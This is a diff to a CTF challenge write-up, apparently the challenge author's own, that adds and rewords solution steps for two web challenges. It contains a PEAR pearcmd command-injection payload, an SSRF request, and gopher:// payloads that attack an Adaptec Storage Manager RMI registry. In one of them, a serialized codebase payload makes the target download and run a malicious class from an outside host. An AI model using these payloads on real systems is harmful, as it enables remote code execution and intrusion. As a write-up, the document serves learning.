@@ -13,7 +13,7 @@
 
 ## Solution
 
-In 2020, I have made a similar challenge in a CTF (巅峰极客2020 - MeowWorld).
+In 2020, I have made a similar challenge in a chinese CTF (巅峰极客2020 - MeowWorld).
 
 But the difference is that we can't use http/https and our webshell should start with `<?php`.
 
@@ -24,7 +24,7 @@ But the difference is that we can't use http/https and our webshell should start
 
 ### Unintended Solution
 
-There are many unintended solutions :D
+There are many interesting unintended solutions :D
 
 - sol1 - command injection (from 0daysober)
     - `/?+install+-R+&kaibro=/usr/local/lib/php/pearcmd&+-R+/tmp/other+channel://pear.php.net/Archive_Tar-1.4.14`
@@ -46,7 +46,7 @@ There are many unintended solutions :D
 - Difficulty: ★★
 - Type: Web
 - Solved: 2 / 284
-- Tag: Java, RealWorld, BlackBox
+- Tag: Java, RealWorld, BlackBox, Pentesting
 
 ## Source Code
 
@@ -54,12 +54,21 @@ There are many unintended solutions :D
 
 ## Solution
 
+1. Find the SSRF vulnerability
 
-First, find SSRF and do port scanning.
+```
+POST /index.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+url=http://kaibro.tw
+```
+
+2. Port Scanning to `flagserver.local`
 
 There are many open ports on `flagserver.local`, like `34571`, `34572`, ...
 
-If you visit http://flagserver.local:34572, you will see this response:
+If you visit http://flagserver.local:34572, you will see the following response:
 
 ```
 <OBJECT
@@ -101,20 +110,20 @@ If you visit http://flagserver.local:34572, you will see this response:
 </OBJECT>
 ```
 
-or you can visit http://flagserver.local:34572/nonexistent, you will see that 404 page:
+Try to google these keywords, and you will find `Adaptec Storage Manager`.
+
+(The 404 page also tell you this is Adaptec Storage Manager Server: `Adaptec Storage Manager File Server:  Error 404.`)
+
+So our target is to pwn this Adaptec Storage Manager server!
+
+3. Attack RMI
+
+If you [install Adaptec Storage Manager](https://adaptec.com/en-us/downloads/storage_manager/sm/productid=sas-3085&dn=adaptec+raid+3085.html) on your local machine or decompiling the RaidManS.jar, you will find that 34571 port is **RMI Registry** Service.
+
+Next, you can send RMI packet with `gopher://` to verify it:
 
 ```
-Adaptec Storage Manager File Server:  Error 404.
-```
-
-So our target is to attack Adaptec Storage Manager server.
-
-And you will know there is a **RMI** service on 34571 port. (by installing Adaptec Storage Manager or downloading RaidManS.jar.)
-
-You can send RMI packet by `gopher://` to the 34571 port:
-
-```
-url=gopher://flagserver:34571/_JRMI%2500%02K%2500%2500%2500%2500%2500%2500
+url=gopher://flagserver.local:34571/_JRMI%2500%02K%2500%2500%2500%2500%2500%2500
 ```
 
 ->
@@ -133,16 +142,16 @@ Because this service is very old, so the jdk is very likely to be old too.
 So we can try to attack the codebase, setting the codebase to our server:
 
 ```
-gopher://flagserver:34571/_JRMI%2500%2502K%2500%2500%2500%2500%2500%2500P%25AC%25ED%2500%2505w%2522%2500%2500%2500%2500%2500%2500%2500%2502%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%25F6%25B6%2589%258D%258B%25F2%2586Cur%2500%2518%255BLjava.rmi.server.ObjID%253B%2587%2513%2500%25B8%25D0%252Cd%257E%2502%2500%2500pxp%2500%2500%2500%2500w%2508%2500%2500%2500%2500%2500%2500%2500%2500sr%2500%2510kaibro.RMILoader%2500%2500%2500%2500%2500%2500%2500%2501%2502%2500%2500t%2500%2516http%253A%252F%252F30cm.club%252F%252F%252F%252F%252F%252Fxpw%2501%2500%250A
+gopher://flagserver.local:34571/_JRMI%2500%2502K%2500%2500%2500%2500%2500%2500P%25AC%25ED%2500%2505w%2522%2500%2500%2500%2500%2500%2500%2500%2502%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%25F6%25B6%2589%258D%258B%25F2%2586Cur%2500%2518%255BLjava.rmi.server.ObjID%253B%2587%2513%2500%25B8%25D0%252Cd%257E%2502%2500%2500pxp%2500%2500%2500%2500w%2508%2500%2500%2500%2500%2500%2500%2500%2500sr%2500%2510kaibro.RMILoader%2500%2500%2500%2500%2500%2500%2500%2501%2502%2500%2500t%2500%2516http%253A%252F%252F30cm.club%252F%252F%252F%252F%252F%252Fxpw%2501%2500%250A
 ```
 
-This payload will download my malicious class file and execute: `http://30cm.club/kaibro/RMILoader.class`
+This payload will download my malicious class file from `http://30cm.club/kaibro/RMILoader.class` and execute it!
 
-RCE!
+=> RCE!
 
 
 
-Note: you should use correct jdk version to compile this malicious class, you can simply send a http request to your server and observe the user-agent to know the jdk version of the RMI service.
+Note: you should use correct jdk version to compile this malicious class, you can simply send a http request to your server and observe the user-agent to know the jdk version of the RMI service:
 
 `HTTP/1.1" 200 1395 "-" "Java/1.6.0_16"`
 
